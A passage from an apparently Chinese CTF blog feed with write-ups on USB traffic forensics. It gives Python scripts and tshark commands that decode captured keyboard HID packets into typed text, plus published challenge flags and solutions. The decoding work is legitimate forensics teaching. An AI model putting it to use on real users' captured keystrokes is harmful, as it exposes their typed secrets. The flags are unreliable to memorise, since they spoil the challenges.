class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/1721634933789-60.png" alt="img"></p><p>flag{a6b93e36-f097-11ec-a9b2-5254002d2b31}</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>usb流量分析</title>
      <link href="/2024/07/22/usb%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2024/07/22/usb%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="usb流量"><a href="#usb流量" class="headerlink" title="usb流量"></a>usb流量</h2><p>简介：</p><p>USB流量指的是USB设备接口的流量，攻击者能够通过监听usb接口流量获取键盘敲击键、鼠标移动与点击、存储设备的铭文传输通信、USB无线网卡网络传输内容等等。在CTF中，USB流量分析主要以键盘和鼠标流量为主</p><h3 id="NISACTF-2022-破损的flag"><a href="#NISACTF-2022-破损的flag" class="headerlink" title="[NISACTF 2022]破损的flag"></a>[NISACTF 2022]破损的flag</h3><p>键盘流量分析</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">DataFileName = <span class="string">&quot;usb.dat&quot;</span></span><br><span class="line"></span><br><span class="line">presses = []</span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># check argv</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage : &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        python UsbKeyboardHacker.py data.pcap&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Tips : &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        To use this python script , you must install the tshark first.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        You can use `sudo apt-get install tshark` to install it&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Author : &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        If you have any questions , please contact me by email.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        Thank you for using.&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get argv</span></span><br><span class="line">    pcapFilePath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># get data of pcap</span></span><br><span class="line">    os.system(<span class="string">&quot;tshark -r %s -T fields -e usb.capdata &#x27;usb.data_len == 8&#x27; &gt; %s&quot;</span> % (pcapFilePath, DataFileName))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># read data</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(DataFileName, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            presses.append(line[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># handle</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> press <span class="keyword">in</span> presses:</span><br><span class="line">        <span class="keyword">if</span> press == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> press:</span><br><span class="line">            Bytes = press.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Bytes = [press[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(press), <span class="number">2</span>)]</span><br><span class="line">        <span class="keyword">if</span> Bytes[<span class="number">0</span>] == <span class="string">&quot;00&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">&quot;00&quot;</span> <span class="keyword">and</span> normalKeys.get(Bytes[<span class="number">2</span>]):</span><br><span class="line">                result += normalKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">int</span>(Bytes[<span class="number">0</span>],<span class="number">16</span>) &amp; <span class="number">0b10</span> <span class="keyword">or</span> <span class="built_in">int</span>(Bytes[<span class="number">0</span>],<span class="number">16</span>) &amp; <span class="number">0b100000</span>: <span class="comment"># shift key is pressed.</span></span><br><span class="line">            <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">&quot;00&quot;</span> <span class="keyword">and</span> normalKeys.get(Bytes[<span class="number">2</span>]):</span><br><span class="line">                result += shiftKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Unknow Key : %s&quot;</span> % (Bytes[<span class="number">0</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Found : %s&quot;</span> % (result))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># clean the temp data</span></span><br><span class="line">    os.system(<span class="string">&quot;rm ./%s&quot;</span> % (DataFileName))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/img/1721631569202-9.png" alt="img"></p><p>ujkonjk,tfvbhyhjipokrdcvgrdcvgpokqwsztfvbhujkowazxdqasewsdrpokxdfviklpnjkwsdrrfgyrdcvguhnmkbhjmyhji</p><p>根据键盘上所包围住的找出所对应的字符，例如：ujko所包围的字符是i</p><p>im gulf flag is welcome t fjnu</p><p>NSSCTF{welcome to fjnu}</p><h3 id="CISCN-2022-初赛-ez-usb"><a href="#CISCN-2022-初赛-ez-usb" class="headerlink" title="[CISCN 2022 初赛]ez_usb"></a>[CISCN 2022 初赛]ez_usb</h3><p>wireshark里分析可以为usb中的键盘流量</p><p><img src="/img/1721631569201-1.png" alt="img"></p><p>搜索8个长度的字节包,可以发现其有2.8.1和2.10.1</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">usb.data_len == <span class="number">8</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721631569201-2.png" alt="img"></p><p>使用tshark将其导出</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">tshark -r <span class="number">2.</span>pcapng -T fields -e usbhid.data -Y <span class="string">&quot;usb.data_len == 8&quot;</span> -Y <span class="string">&#x27;usb.src ==&quot;2.8.1&quot;&#x27;</span> &gt; <span class="number">1.</span>txt</span><br><span class="line">tshark -r <span class="number">2.</span>pcapng -T fields -e usbhid.data -Y <span class="string">&quot;usb.data_len == 8&quot;</span> -Y <span class="string">&#x27;usb.src ==&quot;2.10.1&quot;&#x27;</span>&gt; <span class="number">2.</span>txt</span><br></pre></td></tr></table></figure><p><img src="/img/1721631569201-3.png" alt="img"></p><p><img src="/img/1721631569201-4.png" alt="img"></p><p>由于导出数据没有加：所以我们要给其加上：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;3.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out3.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>: <span class="comment"># 鼠标流量的话len改为8</span></span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721631569201-5.png" alt="img"></p><p>键盘流量转化：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span 